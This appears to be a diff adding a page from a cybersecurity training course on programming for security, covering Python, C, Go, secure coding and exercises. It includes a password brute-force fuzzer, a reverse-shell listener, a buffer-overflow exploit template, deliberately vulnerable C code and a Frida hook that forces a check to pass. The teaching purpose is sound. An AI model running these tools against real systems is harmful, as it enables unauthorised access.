@@ -1,0 +1,655 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+<title>Programming for security: Python, C, Go — Cybersec Zero to Hero</title>
+<link rel="stylesheet" href="../../styles.css">
+</head>
+<body>
+<div class="app">
+  <aside class="sidebar">
+  <div class="sidebar-header">
+    <div class="brand">
+      <div class="brand-mark">&gt;_</div>
+      <div>
+        <div class="brand-title">CYBERSEC</div>
+        <div class="brand-subtitle">zero · to · hero</div>
+      </div>
+    </div>
+    <div class="lang-switch"><a href="../../pages/07-programmazione-security.html" class="lang-link" title="Passa all'italiano"><svg viewBox="0 0 30 20" width="22" height="15"><rect width="10" height="20" fill="#009246"/><rect x="10" width="10" height="20" fill="#fff"/><rect x="20" width="10" height="20" fill="#ce2b37"/></svg> IT</a><span class="lang-active" title="English"><svg viewBox="0 0 30 20" width="22" height="15"><rect width="30" height="20" fill="#012169"/><path d="M0,0 L30,20 M30,0 L0,20" stroke="#fff" stroke-width="3"/><path d="M0,0 L30,20 M30,0 L0,20" stroke="#c8102e" stroke-width="1.5"/><path d="M15,0 v20 M0,10 h30" stroke="#fff" stroke-width="5"/><path d="M15,0 v20 M0,10 h30" stroke="#c8102e" stroke-width="3"/></svg> EN</span></div>
+  </div>
+  <div class="search-wrap">
+    <div class="search-row">
+      <div class="search-inputwrap">
+        <span class="search-icon" aria-hidden="true">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="11" cy="11" r="7"/>
+            <line x1="20" y1="20" x2="16.65" y2="16.65"/>
+          </svg>
+        </span>
+        <input class="search-input" id="search-input" type="text" placeholder="search... (press /)" autocomplete="off" aria-label="Search">
+        <button class="search-clear" id="search-clear" type="button" aria-label="Clear" title="Clear">&times;</button>
+      </div>
+      <button class="search-btn" id="search-btn" type="button" aria-label="SEARCH" title="SEARCH">SEARCH</button>
+    </div>
+    <div class="search-hits" id="search-hits" role="listbox"></div>
+  </div>
+  <div class="sidebar-nav">
+    <nav class="nav-section">
+      <div class="nav-section-title">Path</div>
+      <ul class="nav-list">
+        <li class="nav-item"><a href="../index.html"><span class="num">00</span>Home</a></li>
+        <li class="nav-item"><a href="../pages/00-path-and-mindset.html" class=""><span class="num">00</span>Path, mindset, ethics and law</a></li><li class="nav-item"><a href="../pages/00b-math-and-cs.html" class=""><span class="num">00b</span>Math and computation theory (the bare minimum, integrated)</a></li><li class="nav-item"><a href="../pages/01-cs-fundamentals.html" class=""><span class="num">01</span>Computer science fundamentals for security</a></li><li class="nav-item"><a href="../pages/01b-assembly-from-zero.html" class=""><span class="num">01b</span>x86-64 and ARM64 Assembly from zero</a></li><li class="nav-item"><a href="../pages/02-essential-linux.html" class=""><span class="num">02</span>Essential Linux for security</a></li><li class="nav-item"><a href="../pages/02b-regex-automata.html" class=""><span class="num">02b</span>Regex, automata, and parsers for security</a></li><li class="nav-item"><a href="../pages/03-networking-tcp-ip.html" class=""><span class="num">03</span>Networking: from cables to TCP/IP</a></li><li class="nav-item"><a href="../pages/04-http-tls.html" class=""><span class="num">04</span>HTTP, HTTPS and TLS in depth</a></li><li class="nav-item"><a href="../pages/05-cryptography.html" class=""><span class="num">05</span>Cryptography: theory and practice</a></li><li class="nav-item"><a href="../pages/05b-crypto-worked-examples.html" class=""><span class="num">05b</span>Cryptography — step-by-step worked examples</a></li><li class="nav-item"><a href="../pages/06-os-internals.html" class=""><span class="num">06</span>OS internals: Linux and Windows in depth</a></li><li class="nav-item"><a href="../pages/07-programming-for-security.html" class="active"><span class="num">07</span>Programming for security: Python, C, Go</a></li><li class="nav-item"><a href="../pages/08-osint-recon.html" class=""><span class="num">08</span>OSINT and reconnaissance</a></li><li class="nav-item"><a href="../pages/09-scanning-enumeration.html" class=""><span class="num">09</span>Scanning, enumeration and fingerprinting</a></li><li class="nav-item"><a href="../pages/10-owasp-top10.html" class=""><span class="num">10</span>OWASP Top 10 and beyond — basic web vulnerabilities</a></li><li class="nav-item"><a href="../pages/10b-walkthrough-byte-by-byte.html" class=""><span class="num">10b</span>Byte-by-byte walkthrough: SQLi, XSS, SSRF, IDOR</a></li><li class="nav-item"><a href="../pages/11-advanced-web.html" class=""><span class="num">11</span>Advanced web hacking</a></li><li class="nav-item"><a href="../pages/12-network-attacks.html" class=""><span class="num">12</span>Network attacks: MITM, spoofing, pivoting</a></li><li class="nav-item"><a href="../pages/13-active-directory.html" class=""><span class="num">13</span>Active Directory hacking</a></li><li class="nav-item"><a href="../pages/14-exploit-development.html" class=""><span class="num">14</span>Exploit development: from buffer overflow to ROP</a></li><li class="nav-item"><a href="../pages/14b-bof-to-shell-complete.html" class=""><span class="num">14b</span>BoF → shell: a complete exploit from zero</a></li><li class="nav-item"><a href="../pages/15-reverse-engineering.html" class=""><span class="num">15</span>Reverse engineering</a></li><li class="nav-item"><a href="../pages/16-malware-analysis.html" class=""><span class="num">16</span>Malware: taxonomy and analysis</a></li><li class="nav-item"><a href="../pages/17-mobile-security.html" class=""><span class="num">17</span>Mobile security: Android and iOS</a></li><li class="nav-item"><a href="../pages/18-cloud-security.html" class=""><span class="num">18</span>Cloud security: AWS, Azure, GCP</a></li><li class="nav-item"><a href="../pages/19-container-kubernetes.html" class=""><span class="num">19</span>Containers and Kubernetes</a></li><li class="nav-item"><a href="../pages/20-wireless-radio.html" class=""><span class="num">20</span>Wireless and radio: WiFi, BT, SDR</a></li><li class="nav-item"><a href="../pages/21-hardware-firmware.html" class=""><span class="num">21</span>Hardware and firmware hacking</a></li><li class="nav-item"><a href="../pages/22-forensics-dfir.html" class=""><span class="num">22</span>Forensics and DFIR</a></li><li class="nav-item"><a href="../pages/23-blue-team-soc.html" class=""><span class="num">23</span>Blue team: SOC, SIEM, EDR, hunting</a></li><li class="nav-item"><a href="../pages/24-threat-intelligence.html" class=""><span class="num">24</span>Threat intelligence</a></li><li class="nav-item"><a href="../pages/25-grc-regulations.html" class=""><span class="num">25</span>GRC, regulations, and standards</a></li><li class="nav-item"><a href="../pages/26-red-team.html" class=""><span class="num">26</span>Red team and adversary emulation</a></li><li class="nav-item"><a href="../pages/27-ai-ml-security.html" class=""><span class="num">27</span>AI / ML security</a></li><li class="nav-item"><a href="../pages/28-capstone-roadmap.html" class=""><span class="num">28</span>Capstone: CTF roadmap, home lab, certifications</a></li><li class="nav-item"><a href="../pages/29-master-cheatsheet.html" class=""><span class="num">29</span>Master cheatsheet</a></li><li class="nav-item"><a href="../pages/30-extended-glossary.html" class=""><span class="num">30</span>Extended glossary (250+ terms)</a></li><li class="nav-item"><a href="../pages/31-it-eu-regulations.html" class=""><span class="num">31</span>IT/EU regulatory references in detail</a></li>
+      </ul>
+    </nav>
+  </div>
+</aside>
+  <main class="main">
+    <div class="content">
+      <div class="page-meta">
+        <span class="pill">Programming</span>
+        <span>Section 10 of 36</span>
+        <span class="level-tag level-int">Level: intermediate</span>
+      </div>
+      <h1>Programming for security: Python, C, Go</h1>
+      <p class="summary">Without knowing how to code, you can&#x27;t write tools, exploits, or automation. Python as the &#x27;lingua franca&#x27;, C to understand what runs underneath, Go/Rust for modern tooling. Secure coding best practices.</p>
+      <div class="info-card">
+  <div class="label">Area</div>
+  <div>Programming</div>
+  <div class="label">Prerequisites</div>
+  <ul class="source-list"><li>Sections 01, 02</li></ul>
+  <div class="label">Tools</div>
+  <ul class="source-list"><li>Python 3.11+, pip, venv</li><li>gcc, gdb, make</li><li>Go 1.22+</li><li>Visual Studio Code / Neovim</li></ul>
+</div>
+      <blockquote>
+<p><strong>You can't do high-level offensive work without programming.</strong> The tools you use are code. The bugs you hunt are code. The exploits you write are code. The malware you reverse engineer is code. Go learn.</p>
+</blockquote>
+<h2 id="which-languages-and-why">Which languages and why</h2>
+<table>
+<thead>
+<tr>
+<th>Language</th>
+<th>What it's used for in security</th>
+<th>Importance</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Python</strong></td>
+<td>Tooling, scripting, exploit dev, automation, glue</td>
+<td>⭐⭐⭐⭐⭐</td>
+</tr>
+<tr>
+<td><strong>Bash</strong></td>
+<td>OS scripting, post-exploitation, glue</td>
+<td>⭐⭐⭐⭐</td>
+</tr>
+<tr>
+<td><strong>C</strong></td>
+<td>Understanding stack/heap, malware, kernel, shellcode</td>
+<td>⭐⭐⭐⭐</td>
+</tr>
+<tr>
+<td><strong>C++</strong></td>
+<td>Reverse engineering Windows binaries, game engines</td>
+<td>⭐⭐⭐</td>
+</tr>
+<tr>
+<td><strong>JavaScript</strong></td>
+<td>Web (XSS, prototype pollution), Node</td>
+<td>⭐⭐⭐⭐</td>
+</tr>
+<tr>
+<td><strong>PowerShell</strong></td>
+<td>Windows post-exploitation</td>
+<td>⭐⭐⭐⭐</td>
+</tr>
+<tr>
+<td><strong>Go</strong></td>
+<td>Modern implants, static offensive tools, cross-compilation</td>
+<td>⭐⭐⭐⭐</td>
+</tr>
+<tr>
+<td><strong>Rust</strong></td>
+<td>Modern tooling, some new-generation malware</td>
+<td>⭐⭐⭐</td>
+</tr>
+<tr>
+<td><strong>C#</strong></td>
+<td>.NET, Active Directory, Rubeus, Seatbelt, BloodHound</td>
+<td>⭐⭐⭐⭐</td>
+</tr>
+<tr>
+<td><strong>Assembly x86/x64 and ARM</strong></td>
+<td>Reverse engineering, exploit dev, shellcode</td>
+<td>⭐⭐⭐⭐</td>
+</tr>
+<tr>
+<td><strong>SQL</strong></td>
+<td>SQLi, blue team log queries</td>
+<td>⭐⭐⭐</td>
+</tr>
+<tr>
+<td><strong>YAML/JSON/Regex</strong></td>
+<td>Config, parsing, querying</td>
+<td>⭐⭐⭐⭐</td>
+</tr>
+</tbody>
+</table>
+<p>You don't need to be native-speaker level in all of them. <strong>Python fluency + reading C + reading JS + bash is the minimum.</strong></p>
+<h2 id="python-for-security">Python for security</h2>
+<h3 id="basic-setup">Basic setup</h3>
+<pre><code class="language-bash">python3 -m venv .venv
+source .venv/bin/activate    # Linux/macOS
+# .venv\Scripts\activate     # Windows
+pip install --upgrade pip
+pip install requests beautifulsoup4 dnspython scapy pycryptodome impacket paramiko pwntools
+</code></pre>
+<p>A separate virtualenv per project. Pin versions in <code>requirements.txt</code>.</p>
+<h3 id="useful-standard-library-modules">Useful standard library modules</h3>
+<ul>
+<li><code>os</code>, <code>sys</code>, <code>subprocess</code> — OS interaction.</li>
+<li><code>socket</code> — raw TCP/UDP.</li>
+<li><code>ssl</code> — TLS.</li>
+<li><code>urllib</code>, <code>http.server</code>.</li>
+<li><code>struct</code> — binary pack/unpack.</li>
+<li><code>re</code> — regex.</li>
+<li><code>argparse</code> — CLI parsing.</li>
+<li><code>json</code>, <code>csv</code>, <code>xml</code>, <code>html</code>.</li>
+<li><code>pathlib</code> — modern paths.</li>
+<li><code>concurrent.futures</code> — thread/process pools.</li>
+<li><code>asyncio</code> — event-loop concurrency.</li>
+<li><code>hashlib</code>, <code>hmac</code>, <code>secrets</code>.</li>
+<li><code>logging</code>.</li>
+</ul>
+<h3 id="third-party-libraries-for-offensive-work">Third-party libraries for offensive work</h3>
+<table>
+<thead>
+<tr>
+<th>Library</th>
+<th>Use</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>requests</strong> / <strong>httpx</strong></td>
+<td>HTTP client</td>
+</tr>
+<tr>
+<td><strong>aiohttp</strong> / <strong>httpx</strong></td>
+<td>async HTTP</td>
+</tr>
+<tr>
+<td><strong>BeautifulSoup</strong>, <strong>lxml</strong></td>
+<td>HTML parsing</td>
+</tr>
+<tr>
+<td><strong>scapy</strong></td>
+<td>packet crafting/sniffing</td>
+</tr>
+<tr>
+<td><strong>dnspython</strong></td>
+<td>DNS</td>
+</tr>
+<tr>
+<td><strong>paramiko</strong> / <strong>fabric</strong></td>
+<td>SSH</td>
+</tr>
+<tr>
+<td><strong>impacket</strong></td>
+<td>SMB/AD/Kerberos (Microsoft net stack)</td>
+</tr>
+<tr>
+<td><strong>bloodhound-python</strong></td>
+<td>BloodHound collector</td>
+</tr>
+<tr>
+<td><strong>pwntools</strong></td>
+<td>exploit dev / CTF</td>
+</tr>
+<tr>
+<td><strong>pycryptodome</strong> / <strong>cryptography</strong></td>
+<td>crypto</td>
+</tr>
+<tr>
+<td><strong>frida</strong></td>
+<td>dynamic instrumentation</td>
+</tr>
+<tr>
+<td><strong>angr</strong></td>
+<td>symbolic execution</td>
+</tr>
+<tr>
+<td><strong>capstone</strong> / <strong>keystone</strong> / <strong>unicorn</strong></td>
+<td>disassemble/assemble/emulate</td>
+</tr>
+</tbody>
+</table>
+<h3 id="example-minimal-port-scanner">Example: minimal port scanner</h3>
+<pre><code class="language-python">import socket, concurrent.futures, sys
+
+def scan(host, port, timeout=1.0):
+    try:
+        with socket.create_connection((host, port), timeout=timeout) as s:
+            return port
+    except (socket.timeout, ConnectionRefusedError, OSError):
+        return None
+
+def scan_host(host, ports):
+    open_ports = []
+    with concurrent.futures.ThreadPoolExecutor(max_workers=200) as ex:
+        for p in ex.map(lambda p: scan(host, p), ports):
+            if p is not None:
+                open_ports.append(p)
+    return sorted(open_ports)
+
+if __name__ == &quot;__main__&quot;:
+    host = sys.argv[1] if len(sys.argv) &gt; 1 else &quot;scanme.nmap.org&quot;
+    print(scan_host(host, range(1, 1025)))
+</code></pre>
+<p>Run it against <strong><code>scanme.nmap.org</code></strong> (the Nmap Project offers it for training). Never against anything else without permission.</p>
+<h3 id="example-basic-http-fuzzer">Example: basic HTTP fuzzer</h3>
+<pre><code class="language-python">import requests, itertools, string
+
+BASE = &quot;https://example.com/login&quot;
+USER = &quot;admin&quot;
+ALPHA = string.ascii_lowercase + string.digits
+
+session = requests.Session()
+session.headers[&quot;User-Agent&quot;] = &quot;fuzzer/0.1&quot;
+
+for pwd_len in range(3, 5):
+    for combo in itertools.product(ALPHA, repeat=pwd_len):
+        pwd = &quot;&quot;.join(combo)
+        r = session.post(BASE, data={&quot;u&quot;: USER, &quot;p&quot;: pwd}, allow_redirects=False)
+        # discriminatore: status / response length / Set-Cookie presence
+        if r.status_code == 302 and &quot;session&quot; in r.headers.get(&quot;set-cookie&quot;, &quot;&quot;):
+            print(&quot;HIT:&quot;, pwd)
+            break
+</code></pre>
+<p>To extend with threading/async, rate limiting, and reading from a wordlist (rockyou).</p>
+<h3 id="example-dns-enumeration">Example: DNS enumeration</h3>
+<pre><code class="language-python">import dns.resolver
+import sys
+
+def enum_subs(domain, wordlist):
+    r = dns.resolver.Resolver()
+    r.timeout = 1; r.lifetime = 2
+    for w in wordlist:
+        sub = f&quot;{w}.{domain}&quot;
+        try:
+            ans = r.resolve(sub, 'A')
+            for a in ans:
+                print(f&quot;{sub:&lt;40} {a}&quot;)
+        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.exception.Timeout):
+            pass
+
+if __name__ == &quot;__main__&quot;:
+    with open(sys.argv[2]) as f:
+        words = [w.strip() for w in f if w.strip()]
+    enum_subs(sys.argv[1], words)
+</code></pre>
+<h3 id="example-reverse-shell-handler-in-python">Example: reverse shell handler in Python</h3>
+<pre><code class="language-python"># attacker
+import socket, threading, sys
+
+def handle(conn, addr):
+    print(f&quot;[+] conn from {addr}&quot;)
+    try:
+        while True:
+            cmd = input(&quot;$ &quot;).strip()
+            if not cmd: continue
+            if cmd == &quot;exit&quot;: break
+            conn.sendall((cmd + &quot;\n&quot;).encode())
+            data = b&quot;&quot;
+            conn.settimeout(2)
+            try:
+                while True:
+                    chunk = conn.recv(4096)
+                    if not chunk: break
+                    data += chunk
+            except socket.timeout:
+                pass
+            sys.stdout.write(data.decode(errors=&quot;replace&quot;))
+    finally:
+        conn.close()
+
+def main(port):
+    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind((&quot;0.0.0.0&quot;, port)); s.listen(1)
+    print(f&quot;[*] listening on {port}&quot;)
+    while True:
+        c, a = s.accept()
+        threading.Thread(target=handle, args=(c, a), daemon=True).start()
+
+main(int(sys.argv[1]) if len(sys.argv) &gt; 1 else 4444)
+</code></pre>
+<h3 id="pwntools-for-ctfexploit-dev">Pwntools (for CTF/exploit dev)</h3>
+<pre><code class="language-python">from pwn import *
+
+context.binary = &quot;./vuln&quot;
+io = process(&quot;./vuln&quot;)            # locale
+# io = remote(&quot;host&quot;, 1337)       # remoto
+io.recvuntil(b&quot;input: &quot;)
+payload = b&quot;A&quot; * 40 + p64(0xdeadbeefcafebabe)
+io.sendline(payload)
+io.interactive()
+</code></pre>
+<p><code>pwntools</code> abstracts you away from binascii/struct, integrates <code>gdb.attach</code>, includes a ROP gadget finder, format-string helpers, etc. <strong>Learn the manual way first</strong>: understand <code>p64</code>, <code>p32</code>, endian layout, and how to compute the RIP offset.</p>
+<h3 id="python-best-practices">Python best practices</h3>
+<ol>
+<li><strong>Type hints</strong> (<code>def f(x: int) -&gt; str:</code>).</li>
+<li><strong>Logging</strong> instead of <code>print</code>.</li>
+<li><strong>Modern paths</strong> (<code>pathlib</code>).</li>
+<li><strong>Always use venv</strong>.</li>
+<li><strong>Validate input</strong> if you take user arguments in offensive tools (yes, that's the whole point).</li>
+<li><strong>Never run <code>subprocess.run(cmd, shell=True)</code></strong> with unsanitized user input (command injection). Prefer <code>shell=False</code> plus a list.</li>
+<li><strong>Never <code>eval</code>/<code>exec</code></strong> on uncontrolled input.</li>
+<li><strong>Constant-time compare</strong> for tokens / hashes (<code>hmac.compare_digest</code>).</li>
+</ol>
+<h2 id="c-the-language-for-understanding-whats-underneath">C — the language for understanding what's underneath</h2>
+<p>Knowing C gives you:
+- The ability to read malware (most of it is C/C++).
+- The ability to write shellcode/exploits.
+- The ability to understand decompiled output from Ghidra/IDA.
+- A precise grasp of pointers/memory/UB.</p>
+<h3 id="annotated-example">Annotated example</h3>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+void weak_copy(char *dst, const char *src) {
+    while (*src) *dst++ = *src++;  // copia senza limite — buffer overflow se dst troppo piccolo
+    *dst = '\0';
+}
+
+int main(int argc, char **argv) {
+    if (argc &lt; 2) {
+        fprintf(stderr, &quot;usage: %s &lt;input&gt;\n&quot;, argv[0]);
+        return 1;
+    }
+    char buf[16];
+    weak_copy(buf, argv[1]);
+    printf(&quot;Got: %s\n&quot;, buf);
+    return 0;
+}
+</code></pre>
+<p>Compile and break it:</p>
+<pre><code class="language-bash">gcc -fno-stack-protector -z execstack -no-pie -o weak weak.c
+./weak &quot;$(python3 -c 'print(&quot;A&quot;*100)')&quot;   # segfault!
+</code></pre>
+<h3 id="c-bug-patterns-youll-hunt-for">C bug patterns you'll hunt for</h3>
+<ul>
+<li><strong>Buffer overflow</strong>: <code>strcpy</code>, <code>strcat</code>, <code>sprintf</code>, <code>gets</code>. All banned in 2026. Use <code>strncpy_s</code>, <code>snprintf</code>, etc., and remember to null-terminate.</li>
+<li><strong>Off-by-one</strong>: the classic <code>for (i=0; i&lt;=n; i++) buf[i]=...</code>.</li>
+<li><strong>Format string</strong>: <code>printf(user_input)</code> instead of <code>printf("%s", user_input)</code>. Allows arbitrary memory read/write (see section 14).</li>
+<li><strong>Integer overflow/underflow</strong>: <code>malloc(n * sizeof(T))</code> where <code>n</code> is attacker-controlled → overflow → small allocation → heap overflow.</li>
+<li><strong>Use-after-free</strong>: using a pointer after <code>free</code>.</li>
+<li><strong>Double free</strong>.</li>
+<li><strong>Null deref</strong>, <strong>uninitialized memory</strong>.</li>
+<li><strong>TOCTOU</strong>: <code>access()</code> then <code>open()</code>.</li>
+<li><strong>Signal handler race conditions</strong>.</li>
+</ul>
+<h3 id="compiledebug-flow">Compile/Debug flow</h3>
+<pre><code class="language-bash">gcc -Wall -Wextra -Werror -O0 -g vuln.c -o vuln
+gdb ./vuln
+(gdb) run &quot;AAAA&quot;
+(gdb) info registers
+(gdb) x/40wx $rsp
+(gdb) disas main
+</code></pre>
+<p>For training: the <code>pwndbg</code>, <code>gef</code>, <code>peda</code> extensions — they give gdb a modern UX.</p>
+<h2 id="go-for-modern-tooling">Go for modern tooling</h2>
+<p>Strengths:
+- Compiles to a single static binary (no runtime dependencies).
+- Cross-compilation is trivial.
+- Goroutines for concurrency.
+- Native HTTP/2/3, mature crypto/net standard library.
+- Simple syntax.</p>
+<p>Used in tools like <strong>gobuster</strong>, <strong>ffuf</strong>, <strong>subfinder</strong>, <strong>nuclei</strong>, <strong>httpx</strong>, <strong>interactsh</strong>, in modern C2 frameworks (<strong>Sliver</strong>, <strong>Havoc-side</strong>), and in a great deal of modern malware.</p>
+<pre><code class="language-go">// scanner.go
+package main
+
+import (
+    &quot;context&quot;
+    &quot;fmt&quot;
+    &quot;net&quot;
+    &quot;os&quot;
+    &quot;strconv&quot;
+    &quot;sync&quot;
+    &quot;time&quot;
+)
+
+func scan(host string, port int, wg *sync.WaitGroup, sem chan struct{}) {
+    defer wg.Done()
+    sem &lt;- struct{}{}
+    defer func() { &lt;-sem }()
+
+    addr := net.JoinHostPort(host, strconv.Itoa(port))
+    ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
+    defer cancel()
+    d := net.Dialer{}
+    conn, err := d.DialContext(ctx, &quot;tcp&quot;, addr)
+    if err == nil {
+        fmt.Println(&quot;open&quot;, port)
+        conn.Close()
+    }
+}
+
+func main() {
+    host := os.Args[1]
+    var wg sync.WaitGroup
+    sem := make(chan struct{}, 200)
+    for p := 1; p &lt;= 1024; p++ {
+        wg.Add(1)
+        go scan(host, p, &amp;wg, sem)
+    }
+    wg.Wait()
+}
+</code></pre>
+<p><code>go build scanner.go &amp;&amp; ./scanner scanme.nmap.org</code>. Cross-compile: <code>GOOS=windows GOARCH=amd64 go build</code>.</p>
+<h2 id="c-for-ad-and-net-tooling">C# for AD and .NET tooling</h2>
+<p>Indispensable tools in AD pentesting (section 13) are written in C#:
+- <strong>Rubeus</strong> — Kerberos (ASREPRoast, Kerberoasting, golden/silver tickets).
+- <strong>Seatbelt</strong> — local host/AD enumeration.
+- <strong>SharpHound</strong> — collector for BloodHound.
+- <strong>SharpUp / SharpView</strong> — privesc / AD queries.</p>
+<p>To modify or use them you need basic C# knowledge. <strong>Visual Studio Community</strong> is free, or use the <code>dotnet</code> CLI.</p>
+<h2 id="javascript-for-the-web">JavaScript for the web</h2>
+<p>Knowing JS is mandatory for:
+- Recognizing and writing XSS payloads.
+- Reversing SPA Webpack bundles.
+- Analyzing Node/Electron-based malware.
+- Browser extension malware.
+- Prototype pollution.
+- DOM clobbering.</p>
+<p>Know at least: ES6+, <code>Promise</code>/<code>async</code>, <code>fetch</code>, <code>URL</code>/<code>URLSearchParams</code>, <code>JSON.parse</code>, <code>eval</code> and why to avoid it, the differences between <code>globalThis</code>/<code>window</code>.</p>
+<h2 id="powershell-for-windows">PowerShell for Windows</h2>
+<p>For Windows post-exploitation, PowerShell is "the" language. However:
+- Recent versions have <strong>ScriptBlock Logging</strong>, <strong>Module Logging</strong>, <strong>AMSI</strong>, <strong>Constrained Language Mode</strong>.
+- Defender + EDR recognize well-known patterns (see <code>Invoke-Mimikatz</code>).</p>
+<p>Key skills: <code>Invoke-RestMethod</code>, <code>Invoke-WebRequest</code>, <code>Get-ADUser</code>, <code>Get-Process</code>, <code>Get-WmiObject</code>/<code>Get-CimInstance</code>, <code>Set-MpPreference</code> (controls Defender if you're admin), pipeline objects.</p>
+<p>Tip: PowerShell <strong>5.1</strong> has more telemetry than <strong>2.0</strong>, but <code>powershell.exe -version 2</code> is often unavailable on modern Windows 10/11 → don't count on the "downgrade attack" evasion the way you used to.</p>
+<h2 id="bash-zsh-recap">Bash / Zsh — recap</h2>
+<p>Already covered in section 02. Adding:
+- <code>eval</code> is evil: user input → RCE.
+- Paranoid quoting: <code>"$var"</code>, <code>"$@"</code> (NOT <code>$@</code>).
+- <code>set -euo pipefail</code> as the default.
+- Shellcheck (<code>shellcheck script.sh</code>) for static analysis.</p>
+<h2 id="secure-coding-the-principle">Secure coding — the principle</h2>
+<p>Even if your job is offensive, knowing how to write secure code is crucial:</p>
+<ol>
+<li><strong>Validate input at the boundary</strong>: assume input is hostile.</li>
+<li><strong>Parameterized queries</strong> always (never <code>f"SELECT * WHERE id={id}"</code>).</li>
+<li><strong>Output encoding</strong>: HTML, URL, SQL, shell, log — the right encoding for the context.</li>
+<li><strong>Authn ≠ Authz</strong>. Keep them separate.</li>
+<li><strong>Least privilege</strong>: every service runs with minimum privileges.</li>
+<li><strong>Defense in depth</strong>: multiple independent layers.</li>
+<li><strong>Fail safe / fail closed</strong>: on error, deny access.</li>
+<li><strong>Don't roll your own crypto</strong>.</li>
+<li><strong>Logging</strong>, but no secrets in the logs.</li>
+<li><strong>Patch management</strong>, dependencies kept up to date (SBOM, Renovate, Dependabot, OSV-Scanner).</li>
+<li><strong>Threat modeling</strong> at the design stage (STRIDE).</li>
+</ol>
+<h3 id="sastdastsca">SAST/DAST/SCA</h3>
+<ul>
+<li><strong>SAST</strong> (Static Application Security Testing): code analysis without running it. Tools: SonarQube, Semgrep, CodeQL, Snyk Code, Checkov for IaC.</li>
+<li><strong>DAST</strong> (Dynamic): tests the app while it's running (ZAP, Burp Suite Scanner).</li>
+<li><strong>SCA</strong> (Software Composition Analysis): vulnerabilities in dependencies (Snyk Open Source, Dependabot, Trivy, Grype).</li>
+<li><strong>IAST</strong>: hybrid (in-process agent).</li>
+<li><strong>Fuzzing</strong>: random inputs to discover crashes (AFL++, libFuzzer, Honggfuzz, OSS-Fuzz).</li>
+</ul>
+<h2 id="exercises">Exercises</h2>
+<h3 id="exercise-71-mini-tool">Exercise 7.1 — Mini-tool</h3>
+<p>Write a Python script that, given a list of URLs, performs GET requests with a 3s timeout and outputs CSV: <code>url, status, length, server_header, title</code>.</p>
+<details><summary>Solution</summary>
+
+
+<pre><code class="language-python">import csv, sys, requests, re
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+def fetch(url):
+    try:
+        r = requests.get(url, timeout=3, allow_redirects=True, verify=False)
+        m = re.search(r&quot;&lt;title&gt;([^&lt;]*)&lt;/title&gt;&quot;, r.text, re.IGNORECASE)
+        title = m.group(1).strip() if m else &quot;&quot;
+        return (url, r.status_code, len(r.content), r.headers.get(&quot;server&quot;, &quot;&quot;), title)
+    except Exception as e:
+        return (url, &quot;ERR&quot;, 0, &quot;&quot;, str(e)[:80])
+
+urls = [l.strip() for l in open(sys.argv[1]) if l.strip()]
+w = csv.writer(sys.stdout)
+w.writerow([&quot;url&quot;,&quot;status&quot;,&quot;length&quot;,&quot;server&quot;,&quot;title&quot;])
+with ThreadPoolExecutor(max_workers=50) as ex:
+    for fut in as_completed([ex.submit(fetch, u) for u in urls]):
+        w.writerow(fut.result())
+</code></pre>
+
+
+</details>
+
+<h3 id="exercise-72-write-an-ssh-brute-forcer-client">Exercise 7.2 — Write an SSH brute-forcer client</h3>
+<p>With <code>paramiko</code>, given <code>host:port</code>, a user list, and a password list, attempt login. Output: successful tuples. Add:
+- a per-attempt timeout,
+- max concurrency (asyncio or thread pool),
+- early exit on lockout (HTTP 429-style: after N failures stop for a cooldown).</p>
+<p><strong>Lab use only</strong>.</p>
+<h3 id="exercise-73-buffer-overflow-proof-of-concept">Exercise 7.3 — Buffer overflow proof of concept</h3>
+<p>Compile and analyze:</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+int main(int argc, char **argv) {
+    char buf[64];
+    strcpy(buf, argv[1]);
+    return 0;
+}
+</code></pre>
+<p>With <code>gcc -fno-stack-protector -no-pie -z execstack -o bof bof.c</code>.
+- Find the exact offset that overwrites RIP (use <code>pwntools</code> <code>cyclic</code>).
+- How many bytes? Which register contains the pattern after the crash in gdb?</p>
+<details><summary>Hint</summary>
+
+
+<pre><code class="language-python">from pwn import *
+p = cyclic(200)
+io = process([&quot;./bof&quot;, p])
+io.wait()
+core = io.corefile
+print(cyclic_find(core.fault_addr &amp; 0xffffffffffffffff))
+</code></pre>
+
+
+The typical offset is 72 (64 buf + 8 saved RBP) but it can vary with compiler padding.
+
+</details>
+
+<h3 id="exercise-74-go-http-fuzzer">Exercise 7.4 — Go HTTP fuzzer</h3>
+<p>Rewrite the previous Python fuzzer in Go. Use goroutines for parallelism.</p>
+<h3 id="exercise-75-frida-function-sniffing">Exercise 7.5 — Frida function sniffing</h3>
+<p>On a binary with symbols, hook a function <code>int validate(char *input)</code>:</p>
+<pre><code class="language-js">// frida script
+const validate = Module.findExportByName(null, &quot;validate&quot;);
+Interceptor.attach(validate, {
+    onEnter(args) {
+        console.log(&quot;input:&quot;, args[0].readUtf8String());
+    },
+    onLeave(retval) {
+        console.log(&quot;ret:&quot;, retval);
+        retval.replace(1);  // bypass: forza ritorno 1
+    }
+});
+</code></pre>
+<pre><code class="language-bash">frida -l hook.js -f ./target
+</code></pre>
+<p>Try it on a crackme from <a href="https://crackmes.one">crackmes.one</a>.</p>
+<h3 id="exercise-76-semgrep">Exercise 7.6 — Semgrep</h3>
+<p>Install Semgrep. Run public rules on an open Python project (e.g., a small Flask app):</p>
+<pre><code class="language-bash">pip install semgrep
+semgrep --config &quot;p/python&quot; .
+semgrep --config &quot;p/security-audit&quot; .
+</code></pre>
+<p>What does it find? How many false positives? What's the difference between <code>--config p/python</code> and <code>--config p/owasp-top-ten</code>?</p>
+<h3 id="exercise-77-write-a-semgrep-rule">Exercise 7.7 — Write a Semgrep rule</h3>
